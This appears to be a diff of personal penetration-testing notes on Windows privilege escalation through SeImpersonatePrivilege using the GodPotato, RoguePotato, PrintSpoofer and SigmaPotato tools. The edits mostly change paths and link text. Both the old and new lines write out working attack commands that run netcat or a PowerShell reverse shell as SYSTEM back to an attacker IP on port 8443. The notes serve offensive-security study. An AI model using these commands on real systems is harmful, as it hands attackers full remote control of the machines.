@@ -412,7 +412,7 @@ subsequently enabling the execution of a process with `SYSTEM` privileges
 1. **TARGET**: [[MSSQL/Exploitation#User|Enumerate User Privileges]]
    for enabled `SeImpersonatePrivilege`
 
-2. **TARGET**: [[File Transfer/Windows/Download|Transfer]]
+2. **TARGET**: [[File Transfer/Windows/Download|Download]]
    the exploit and [[Netcat]] to the target
 
 3. **ATTACKER**: Listen with [[Netcat]] on port `8443`
@@ -420,23 +420,23 @@ subsequently enabling the execution of a process with `SYSTEM` privileges
 [GodPotato](https://github.com/BeichenDream/GodPotato)
 
 ```sh
-c:\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe <attacker_ip> 8443"
+C:\GodPotato.exe -cmd "nc -t -e C:\cmd.exe <attacker_ip> 8443"
 ```
 
 [RoguePotato](https://github.com/antonioCoco/RoguePotato)
 
 ```sh
-c:\RoguePotato.exe -r <attacker_ip> -c "c:\tools\nc.exe <attacker_ip> 8443 -e cmd" -l 9999
+C:\RoguePotato.exe -r <attacker_ip> -c "C:\ncat.exe <attacker_ip> 8443 -e cmd" -l 9999
 ```
 
 ```sh
-c:\RoguePotato.exe -r <attacker_ip> -c "c:\tools\nc.exe <attacker_ip> 8443 -e cmd" -f 9999
+C:\RoguePotato.exe -r <attacker_ip> -c "C:\ncat.exe <attacker_ip> 8443 -e cmd" -f 9999
 ```
 
 [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
 
 ```sh
-c:\PrintSpoofer.exe -c "c:\tools\nc.exe <attacker_ip> 8443 -e cmd"
+C:\PrintSpoofer.exe -c "C:\ncat.exe <attacker_ip> 8443 -e cmd"
 ```
 
 <!-- Example {{{-->
@@ -474,7 +474,7 @@ Load and execute from memory (*no disk touch*)
 [SigmaPotato]::Main("cmd /c whoami")
 ```
 
-Spawn a PS reverse shell
+Spawn a [[PowerShell]] [reverse shell](https://www.revshells.com/)
 
 ```sh
 [SigmaPotato]::Main(@("--revshell","<attacker_ip>","8443"))
